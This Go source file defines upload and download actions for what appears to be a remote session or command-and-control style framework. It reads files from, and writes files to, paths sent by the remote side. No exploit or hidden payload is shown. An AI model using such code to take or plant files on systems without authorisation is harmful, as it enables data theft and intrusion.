package action

import (
	"io"
	"os"

	"github.com/iDigitalFlame/xmt/xmt/com"
	"github.com/iDigitalFlame/xmt/xmt/data"
	"github.com/iDigitalFlame/xmt/xmt/device"
)

type upload uint16
type download uint16

func (upload) Thread() bool {
	return true
}
func (download) Thread() bool {
	return true
}
func (upload) File(s string) *com.Packet {
	p := &com.Packet{ID: uint16(Upload)}
	p.WriteString(s)
	return p
}
func (d download) File(s, o string) (*com.Packet, error) {
	f, err := os.Open(device.Expand(s))
	if err != nil {
		return nil, err
	}
	defer f.Close()
	return d.Reader(o, f)
}
func (download) Bytes(s string, b []byte) (*com.Packet, error) {
	p := &com.Packet{ID: uint16(Download)}
	p.WriteString(s)
	if _, err := p.Write(b); err != nil {
		return nil, err
	}
	return p, nil
}
func (download) Reader(s string, r io.Reader) (*com.Packet, error) {
	p := &com.Packet{ID: uint16(Download)}
	p.WriteString(s)
	if _, err := io.Copy(p, r); err != nil {
		return nil, err
	}
	return p, nil
}
func (upload) Execute(s Session, r data.Reader, w data.Writer) error {
	p, err := r.StringVal()
	if err != nil {
		return err
	}
	v := device.Expand(p)
	f, err := os.OpenFile(v, os.O_RDONLY, 0)
	if err != nil {
		return err
	}
	defer f.Close()
	s.Log().Trace("[%s] Reading data to file \"%s\"...", s.Session(), v)
	d, err := f.Stat()
	if err != nil {
		return err
	}
	if err := w.WriteString(v); err != nil {
		return err
	}
	if err := w.WriteInt64(d.Size()); err != nil {
		return err
	}
	_, err = io.Copy(w, f)
	return err
}
func (download) Execute(s Session, r data.Reader, w data.Writer) error {
	p, err := r.StringVal()
	if err != nil {
		return err
	}
	v := device.Expand(p)
	f, err := os.Create(v)
	if err != nil {
		return err
	}
	defer f.Close()
	s.Log().Trace("[%s] Writing data to file \"%s\"...", s.Session(), v)
	n, err := io.Copy(f, r)
	if err != nil {
		return err
	}
	if err := w.WriteString(v); err != nil {
		return err
	}
	if err := w.WriteInt64(n); err != nil {
		return err
	}
	return nil
}
